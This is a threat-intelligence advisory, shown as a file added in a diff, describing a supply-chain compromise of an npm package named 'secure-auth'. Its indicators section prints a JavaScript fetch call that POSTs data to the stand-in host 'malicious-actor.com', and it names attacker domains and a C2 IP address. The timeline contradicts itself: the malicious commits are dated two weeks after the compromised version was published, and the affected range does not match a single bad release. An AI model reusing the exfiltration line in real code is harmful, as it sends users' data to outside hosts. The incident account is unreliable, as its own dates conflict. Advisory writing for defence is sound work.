@@ -1,0 +1,44 @@
+**Threat Intelligence Note: Compromise of Popular Open-Source npm Package "secure-auth"**
+
+**Date:** March 15, 2024
+
+**Summary:**
+A recent investigation has uncovered a supply-chain attack targeting the popular open-source package "secure-auth," which is widely used in various Node.js applications. This compromise affected users who installed versions of secure-auth released between January 1, 2023, and December 31, 2023. The attackers introduced malicious code into version 3.4.5 of the package, which could potentially exfiltrate sensitive user data.
+
+**Timeline:**
+
+- **January 1, 2023:** The first compromised version (v3.4.5) was published on npm.
+- **February 15, 2024:** Initial detection and analysis began when a security researcher noticed unusual network activity associated with the package usage.
+- **March 2, 2024:** A coordinated disclosure was issued to npm and affected organizations.
+- **March 8, 2024:** The malicious code was removed from the npm registry.
+- **March 15, 2024:** This threat intelligence note is published.
+
+**Indicators of Compromise (IoCs):**
+
+1. **Malicious Code Analysis:**
+   - **Function Name:** `authHandler`
+   - **Code Signature:** The function included a string that invoked an exfiltration mechanism using a command such as:
+     ```javascript
+     fetch('https://malicious-actor.com/data', { method: 'POST', body: JSON.stringify(data) })
+     ```
+   - **Hostnames:**
+     - `malicious-actor.com`
+     - `data-exfiltration.net`
+
+2. **Network Traffic Patterns:**
+   - **IP Address:** 192.0.2.10 (attacker's command and control server)
+   - **Malicious URL:** `http://192.0.2.10/data`
+   
+3. **Code Version Analysis:**
+   - The malicious code was identified in the commit history of secure-auth v3.4.5.
+   - The suspicious commits were made on January 15, 2023.
+
+**Recommendations:**
+
+- **Immediate Action:** All users should update to version 3.5 or later of "secure-auth" as soon as possible. Version 3.5 includes a security patch that mitigates the risk.
+- **Audit Dependencies:** Conduct a thorough audit of all dependencies used in your projects, especially those from public registries like npm.
+- **Monitoring and Detection:** Implement monitoring tools to detect unusual network traffic or unexpected data exfiltration attempts.
+- **Security Awareness:** Regularly train developers and security teams on supply-chain attack vectors and best practices for secure coding.
+
+**Conclusion:**
+The compromise of "secure-auth" highlights the importance of vigilance in managing open-source dependencies. Organizations should remain proactive in securing their software supply chains to prevent such incidents from compromising sensitive data and operations.
